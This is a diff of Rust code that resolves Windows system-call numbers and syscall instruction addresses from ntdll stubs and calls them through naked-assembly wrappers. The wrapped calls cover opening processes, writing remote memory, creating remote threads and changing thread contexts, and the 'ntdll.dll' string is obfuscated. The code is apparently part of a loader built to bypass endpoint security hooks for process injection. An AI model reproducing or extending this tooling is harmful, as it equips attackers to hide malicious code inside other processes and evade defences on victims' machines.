@@ -6,11 +6,42 @@ use winapi::um::winnt::{HANDLE, CONTEXT};
 use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 use obfuse::obfuse;
 use export_resolver::ExportList;
-use anyhow::{self, Error, Ok};
+use anyhow::anyhow;
 
 
+#[repr(C)]
+#[derive(Copy, Clone, Debug)]
+pub struct NtSsn {
+    pub ssn: u32,
+    pub syscall_ret: *mut u8,
+}
 
+impl Default for NtSsn {
+    fn default() -> Self {
+        Self { ssn: 0, syscall_ret: std::ptr::null_mut() }
+    }
+}
 
+#[repr(usize)]
+pub enum NtIndex {
+    ZwAllocateVirtualMemory = 0,
+    ZwProtectVirtualMemory = 1,
+    ZwFlushInstructionCache = 2,
+    ZwCreateSection = 3,
+    ZwMapViewOfSection = 4,
+    ZwUnmapViewOfSection = 5,
+    ZwQuerySystemInformation = 6,
+    ZwQueryObject = 7,
+    ZwQueryVirtualMemory = 8,
+    ZwFreeVirtualMemory = 9,
+    ZwSetContextThread = 10,
+    ZwGetContextThread = 11,
+    ZwWriteVirtualMemory = 12,
+    ZwCreateThreadEx = 13,
+    ZwOpenProcess = 14,
+}
+
+const NT_FUNCTION_COUNT: usize = 15;
 
 
 #[unsafe(naked)]
@@ -37,7 +68,7 @@ pub unsafe extern "win64" fn zw_open_process(process_handle: *mut HANDLE, desire
 
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_create_thread_ex(thread_handle: *mut HANDLE, desired_access: u32, object_attributes: *mut OBJECT_ATTRIBUTES, process_handle: *mut HANDLE, start_roution: *mut c_void, argument: *mut c_void, create_flags: u64, zero_bits: usize, stack_size: usize, max_stack_size: usize, attribute_list: *mut c_void, ssn: u32, syscall_ret: *mut u8) -> i32
+pub unsafe extern "win64" fn zw_create_thread_ex(thread_handle: *mut HANDLE, desired_access: u32, object_attributes: *mut OBJECT_ATTRIBUTES, process_handle: HANDLE, start_roution: *mut c_void, argument: *mut c_void, create_flags: u64, zero_bits: usize, stack_size: usize, max_stack_size: usize, attribute_list: *mut c_void, ssn: u32, syscall_ret: *mut u8) -> i32
 {
     naked_asm!(
         "mov r10, rcx",
@@ -48,7 +79,7 @@ pub unsafe extern "win64" fn zw_create_thread_ex(thread_handle: *mut HANDLE, des
 
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_write_virtual_memory(process_handle: *mut HANDLE, base_address: *mut c_void, buffer: *mut c_void, number_of_bytes_to_write: usize, number_of_bytes_written: *mut usize, ssn: u32, syscall_ret: *mut u8)
+pub unsafe extern "win64" fn zw_write_virtual_memory(process_handle: HANDLE, base_address: *mut c_void, buffer: *mut c_void, number_of_bytes_to_write: usize, number_of_bytes_written: *mut usize, ssn: u32, syscall_ret: *mut u8) -> i32
 {
     naked_asm!(
         "mov r10, rcx",
@@ -60,11 +91,11 @@ pub unsafe extern "win64" fn zw_write_virtual_memory(process_handle: *mut HANDLE
 
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_get_context_thread(thread_handle: *mut HANDLE, context: *mut CONTEXT, ssn: u32, syscall_ret: *mut u8)
+pub unsafe extern "win64" fn zw_get_context_thread(thread_handle: HANDLE, context: *mut CONTEXT, ssn: u32, syscall_ret: *mut u8) -> i32
 {
     naked_asm!(
         "mov r10, rcx",
-        "mov eax, r8",
+        "mov eax, r8d",
         "jmp r9"
     )
 
@@ -73,54 +104,15 @@ pub unsafe extern "win64" fn zw_get_context_thread(thread_handle: *mut HANDLE, c
 
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_set_context_thread(thread_handle: *mut HANDLE, context: *mut CONTEXT, ssn: u32, syscall_ret: *mut u8)
+pub unsafe extern "win64" fn zw_set_context_thread(thread_handle: HANDLE, context: *mut CONTEXT, ssn: u32, syscall_ret: *mut u8) -> i32
 {
     naked_asm!(
         "mov r10, rcx",
-        "mov eax, r8",
+        "mov eax, r8d",
         "jmp r9"
     )
 
 }
-
-
-#[repr(C)]
-#[derive(Copy, Clone, Debug)]
-pub struct NtSsn {
-    pub ssn: u32,
-    pub syscall_ret: *mut u8,
-}
-
-// 实现一个默认初始化，方便创建空数组
-impl Default for NtSsn {
-    fn default() -> Self {
-        Self {
-            ssn: 0,
-            syscall_ret: std::ptr::null_mut(),
-        }
-    }
-}
-
-#[repr(usize)]
-pub enum NtIndex {
-    ZwAllocateVirtualMemory = 0,
-    ZwProtectVirtualMemory = 1,
-    ZwFlushInstructionCache = 2,
-    ZwCreateSection = 3,
-    ZwMapViewOfSection = 4,
-    ZwUnmapViewOfSection = 5,
-    ZwQuerySystemInformation = 6,
-    ZwQueryObject = 7,
-    ZwQueryVirtualMemory = 8,
-    ZwFreeVirtualMemory = 9,
-    ZwSetContextThread = 10,
-    ZwGetContextThread = 11,
-    ZwWriteVirtualMemory = 12,
-    ZwCreateThreadEx = 13,
-    ZwOpenProcess = 14,
-}
-
-const NT_FUNCTION_COUNT: usize = 15;
 
     // pub fn ZwProtectVirtualMemory(
     //     ProcessHandle: HANDLE,
@@ -213,23 +205,41 @@ const NT_FUNCTION_COUNT: usize = 15;
     //     syscallret: PBYTE,
     // ) -> NTSTATUS;
 
-
-macro_rules! set_nt_func {
-    ($exports:ident, $name_str:expr, $lock:expr) => {
+macro_rules! set_nt_ssn {
+    ($exports:ident, $func_name:expr, $func_index:expr) => {
         unsafe {
-            // 1. 获取地址并处理 Result (?)
-            let addr = $exports.get_function_address($name_str)? as *const std::ffi::c_void;
-            // 2. 转换并设置全局变量
-            // 注意：transmute 会根据 $lock 里的泛型自动推导出目标函数类型
-            if $lock.set(std::mem::transmute(addr)).is_err() {
-                // 如果设置失败，说明之前已经初始化过了，这里可以根据需求处理
+            let func_addr: *mut u8 = $exports.get_function_address($func_name).expect("API not found...") as *mut u8;
+
+            let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);
+
+            let mut ssn = 0;
+            let mut syscall_ptr: *mut u8 = std::ptr::null_mut();
+            for i in 0..bytes.len().saturating_sub(4) {
+                if bytes[i] == 0xB8 && ssn == 0 {
+                    ssn = u32::from_le_bytes([bytes[i + 1], bytes[i + 2], bytes[i + 3], bytes[i + 4]]);
+                }
+                if bytes[i] == 0x0f && bytes[i + 1] == 0x05 {
+                    syscall_ptr = func_addr.add(i) ;
+                    break;
+                }
             }
+
+            if ssn == 0 || syscall_ptr.is_null() {
+                return Err(anyhow!("[ERROR] Failed to find ssn or syscall address for {}", $func_name));
+            }
+
+            NT_SSN[$func_index as usize] = NtSsn { ssn: ssn , syscall_ret: syscall_ptr };
+
         }
     };
 }
 
 
-pub fn init_nt_api() -> Result<(), Error>{
+
+pub static mut NT_SSN: [NtSsn; NT_FUNCTION_COUNT] = [NtSsn { ssn: 0, syscall_ret: std::ptr::null_mut(), }; NT_FUNCTION_COUNT];
+
+
+pub fn init_nt_api() -> Result<(), anyhow::Error>{
     let obfused_ntdll = obfuse!("ntdll.dll\0");
     let ntdll_str = obfused_ntdll.as_str();
 
@@ -256,8 +266,12 @@ pub fn init_nt_api() -> Result<(), Error>{
     exports.add(ntdll_str, str_zw_get_context_thread)?;
     exports.add(ntdll_str, str_zw_set_context_thread)?;
 
-
-
+    set_nt_ssn!(exports, str_nt_allocate_virtual_memory, NtIndex::ZwAllocateVirtualMemory);
+    set_nt_ssn!(exports, str_nt_write_virtual_memory, NtIndex::ZwWriteVirtualMemory);
+    set_nt_ssn!(exports, str_nt_open_process, NtIndex::ZwOpenProcess);
+    set_nt_ssn!(exports, str_nt_create_thread_ex, NtIndex::ZwCreateThreadEx);
+    set_nt_ssn!(exports, str_zw_get_context_thread, NtIndex::ZwGetContextThread);
+    set_nt_ssn!(exports, str_zw_set_context_thread, NtIndex::ZwSetContextThread);
 
     Ok(())
 }
